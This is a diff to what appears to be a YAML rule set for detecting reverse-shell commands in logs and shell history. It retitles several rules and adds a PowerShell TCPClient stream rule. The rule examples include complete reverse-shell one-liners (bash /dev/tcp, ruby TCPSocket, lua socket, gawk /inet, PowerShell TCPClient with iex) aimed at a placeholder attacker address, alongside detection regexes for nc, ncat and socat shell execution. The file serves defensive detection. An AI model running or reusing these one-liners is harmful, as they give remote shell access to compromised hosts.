@@ -57,7 +57,7 @@
       - 'Nov 20 10:02:02 web01 kernel: [ 12.0] tcp: last ACK of /dev/null ignored'
 
 - id: mention.revshell_fifo_shell_to_client
-  title: 'mkfifo line with a shell piping into a network client'
+  title: 'mkfifo line with a shell and a pipe into a network client'
   match:
     anchored: 'mkfifo [^\n]{0,120}(?:/|\b)(?:ba|da|z|k|a)?sh(?: -i)?\b[^\n|]{0,60}\| {0,2}(?:nc|ncat|netcat|telnet|openssl)\b'
   case_sensitive: false
@@ -82,7 +82,7 @@
       - 'Nov 20 10:03:03 db01 bash[5103]: HISTORY: mkfifo /tmp/f; ssh backup01 "cat > /srv/dump" < /tmp/f'
 
 - id: mention.revshell_fifo_client_to_shell
-  title: 'mkfifo line with a network client piping into a shell'
+  title: 'mkfifo line with a network client and a pipe into a shell'
   match:
     anchored: 'mkfifo [^\n]{0,120}(?:telnet|nc|ncat|openssl s_client) [^\n|]{0,120}\| {0,2}(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b'
   case_sensitive: false
@@ -129,7 +129,7 @@
       - 'Nov 20 10:05:02 web01 bash[5109]: HISTORY: mknod /tmp/ctl p; chmod 600 /tmp/ctl'
 
 - id: mention.revshell_netcat_exec_first_flag
-  title: netcat executing a shell (exec flag in the first option group)
+  title: 'nc -e or -c with a shell argument, in the first option group'
   match:
     anchored: '\bnc -[a-zA-Z]{0,6}[ec] {0,2}(?:(?:/usr)?(?:/bin/)?(?:ba|da|z|k|c|tc|a)?sh\b|cmd(?:\.exe)?\b|powershell(?:\.exe)?\b)'
   case_sensitive: true
@@ -155,7 +155,7 @@
       - 'Nov 20 10:06:04 web01 bash[5114]: HISTORY: nc -zv db01 5432'
 
 - id: mention.revshell_netcat_exec_later_flag
-  title: netcat executing a shell (exec flag after the host or port)
+  title: 'nc -e or -c with a shell argument, after the host or port'
   match:
     anchored: ' nc [^|;&\n]{1,80} -[a-zA-Z]{0,5}[ec] {0,2}(?:(?:/usr)?(?:/bin/)?(?:ba|da|z|k|c|tc|a)?sh\b|cmd(?:\.exe)?\b|powershell(?:\.exe)?\b)'
   case_sensitive: true
@@ -179,7 +179,7 @@
       - 'Nov 20 10:07:03 web01 bash[5117]: HISTORY: tar cf - /srv | nc 10.0.0.9 9000 -q 1'
 
 - id: mention.revshell_netcat_exec_line_start
-  title: netcat executing a shell (line starts with nc)
+  title: 'nc -e or -c with a shell argument, at line start'
   match:
     anchored: '^nc [^|;&\n]{1,80} -[a-zA-Z]{0,5}[ec] {0,2}(?:(?:/usr)?(?:/bin/)?(?:ba|da|z|k|c|tc|a)?sh\b|cmd(?:\.exe)?\b|powershell(?:\.exe)?\b)'
   case_sensitive: true
@@ -201,7 +201,7 @@
       - 'nc 10.0.0.9 9000 < /srv/backup.tar'
 
 - id: mention.revshell_ncat_exec
-  title: ncat executing a shell
+  title: 'ncat -e, -c, --exec or --sh-exec with a shell argument'
   match:
     anchored: 'ncat(?:\.exe)? [^|;&\n]{0,80}(?:-[a-zA-Z]{0,5}[ec]|--exec|--sh-exec) {0,2}["'']?(?:(?:/usr)?(?:/bin/)?(?:ba|da|z|k|c|tc|a)?sh\b|cmd(?:\.exe)?\b|powershell(?:\.exe)?\b)'
   case_sensitive: true
@@ -225,7 +225,7 @@
       - 'Nov 20 10:08:02 web01 bash[5120]: HISTORY: ncat -v --proxy 10.0.0.1:3128 example.org 443'
 
 - id: mention.revshell_netcat_long_name_exec
-  title: netcat (long name) executing a shell
+  title: 'netcat -e or -c with a shell argument'
   match:
     anchored: 'netcat [^|;&\n]{0,80}-[a-zA-Z]{0,5}[ec] {0,2}(?:(?:/usr)?(?:/bin/)?(?:ba|da|z|k|c|tc|a)?sh\b|cmd(?:\.exe)?\b)'
   case_sensitive: true
@@ -248,7 +248,7 @@
       - 'Nov 20 10:09:02 web01 bash[5122]: HISTORY: netcat -zv 10.0.0.5 443'
 
 - id: mention.revshell_netcat_windows_exec
-  title: Windows netcat binary executing cmd or PowerShell
+  title: 'nc.exe -e with cmd or PowerShell'
   match:
     anchored: 'nc\.exe["'']? [^|&\n]{0,80}-[a-zA-Z]{0,5}e {0,2}["'']?(?:cmd|powershell)(?:\.exe)?\b'
   case_sensitive: false
@@ -272,7 +272,7 @@
       - 'C:\Windows\system32\cmd.exe /c ipconfig /all'
 
 - id: mention.revshell_netcat64_windows_exec
-  title: Windows 64-bit netcat binary executing cmd or PowerShell
+  title: 'nc64.exe -e with cmd or PowerShell'
   match:
     anchored: 'nc64\.exe["'']? [^|&\n]{0,80}-[a-zA-Z]{0,5}e {0,2}["'']?(?:cmd|powershell)(?:\.exe)?\b'
   case_sensitive: false
@@ -295,7 +295,7 @@
       - 'C:\Windows\system32\cmd.exe /c ipconfig /all'
 
 - id: mention.revshell_socat_exec_shell
-  title: socat binding a shell to a socket
+  title: 'socat EXEC or SYSTEM address with a shell'
   match:
     anchored: 'socat [^\n]{0,120}(?:exec|system):["'']?(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b'
   case_sensitive: false
@@ -437,7 +437,7 @@
       - 'Nov 20 10:15:02 web01 bash[5137]: HISTORY: perl -e ''open(STDIN, "<", "/tmp/input.txt")'''
 
 - id: mention.revshell_perl_io_socket_exec
-  title: Perl IO::Socket::INET client that hands the socket to a shell
+  title: 'Perl IO::Socket::INET PeerAddr text with fdopen, system or exec'
   match:
     anchored: 'IO::Socket::INET\( {0,2}PeerAddr[^\n]{0,200}(?:fdopen|system|exec)'
   case_sensitive: false
@@ -528,14 +528,14 @@
     positive:
       - 'Nov 20 10:19:00 web01 bash[5142]: HISTORY: lua -e "require(''socket'');t=socket.tcp();t:connect(''203.0.113.7'',''4444'');os.execute(''/bin/sh -i <&3 >&3 2>&3'');"'
       - 'Nov 20 10:19:01 web01 bash[5143]: HISTORY: bash -i 5<> /dev/tcp/203.0.113.7/4444 0<&5 1>&5 2>&5'
-      - 'Nov 21 09:00:44 host01 bash[4100]: HISTORY: bash -i <&196 >&196 2>&196'
-      - 'Nov 21 09:00:45 host01 bash[4100]: HISTORY: bash -i <&%d >&%d 2>&%d'
+      - 'Nov 21 09:00:15 web01 bash[4100]: HISTORY: 0<&196;exec 196<>/dev/tcp/203.0.113.7/443; sh <&196 >&196 2>&196'
+      - 'Nov 21 09:00:16 web01 bash[4100]: HISTORY: ruby -rsocket -e''f=TCPSocket.open("203.0.113.7",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'''
     negative:
       - 'Nov 20 10:19:02 web01 bash[5144]: HISTORY: exec 3>&1 4>&2'
       - 'Nov 20 10:19:03 web01 bash[5145]: HISTORY: ./build.sh 2>&1 | tee build.log'
 
 - id: mention.revshell_ruby_rsocket
-  title: Ruby one-liner loading the socket library
+  title: 'ruby -rsocket -e one-liner text'
   match:
     anchored: 'ruby {1,3}-rsocket {0,3}-e'
   case_sensitive: false
@@ -743,7 +743,7 @@
       - '2026-11-20T10:28:01Z app[704]: proc.stdout.pipe(process.stdout)'
 
 - id: mention.revshell_go_dial_exec_shell
-  title: Go program dialing TCP and running a shell
+  title: 'Go net.Dial("tcp") with exec.Command of a shell'
   match:
     anchored: 'net\.Dial\( {0,2}["'']tcp["''][^\n]{1,160}exec\.Command\( {0,2}["''](?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh'
   case_sensitive: false
@@ -786,6 +786,34 @@
   examples:
     positive:
       - 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(''203.0.113.7'',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String )}"'
+    negative:
+      - '$t = New-Object System.Net.Sockets.TcpClient(''sql01'',1433); $t.Connected; $t.Close()'
+      - '$c = New-Object Net.Sockets.TCPClient(''mail01'',25); $s = $c.GetStream(); $s.Write($hello,0,$hello.Length)'
+
+- id: mention.revshell_powershell_tcpclient_stream
+  title: PowerShell TCPClient stream text with a reader, writer, byte buffer or TLS wrapper
+  match:
+    anchored: 'Sockets\.TCPClient\([^\n]{1,100}\.GetStream\(\)[^\n]{0,60}(?:IO\.StreamReader|IO\.StreamWriter|\[byte\[\]\]|Net\.Security\.SslStream)'
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.001, T1095]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    The opening of every PowerShell TCP reverse shell in the catalog: a Net.Sockets.TCPClient whose stream is wrapped
+    straight away in a StreamReader or StreamWriter, a [byte[]] receive buffer or an SslStream. Short gaps keep it
+    cheap and still cover the long variants whose iex comes 400 to 700 characters later, which the iex entry's
+    bounded gap misses. Port-test scripts open a TCPClient without wrapping its stream; an SMTP or banner test script
+    that wraps the stream in a reader or writer is the known benign look-alike.
+  examples:
+    positive:
+      - '$LHOST = "203.0.113.7"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream)'
+      - 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(''203.0.113.7'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}"'
+      - '$TCPClient = New-Object Net.Sockets.TCPClient(''203.0.113.7'', 4444);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false)'
     negative:
       - '$t = New-Object System.Net.Sockets.TcpClient(''sql01'',1433); $t.Connected; $t.Close()'
       - '$c = New-Object Net.Sockets.TCPClient(''mail01'',25); $s = $c.GetStream(); $s.Write($hello,0,$hello.Length)'
@@ -856,7 +884,7 @@
   examples:
     positive:
       - 'Nov 20 10:32:00 web01 bash[5166]: HISTORY: awk ''BEGIN {s = "/inet/tcp/0/203.0.113.7/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}'' /dev/null'
-      - 'Nov 21 09:00:46 host01 bash[4100]: HISTORY: awk ''BEGIN {s = "/inet/udp/0/203.0.113.7/4444"}'' /dev/null'
+      - 'Nov 21 09:00:17 web01 bash[4100]: HISTORY: gawk ''BEGIN {s = "/inet/udp/0/203.0.113.7/53"; print "x" |& s}'''
     negative:
       - 'Nov 20 10:32:01 web01 bash[5167]: HISTORY: awk ''{print $1}'' /var/log/nginx/access.log'
       - 'Nov 20 10:32:02 web01 bash[5168]: HISTORY: cat /proc/net/tcp | awk ''{print $2}'''
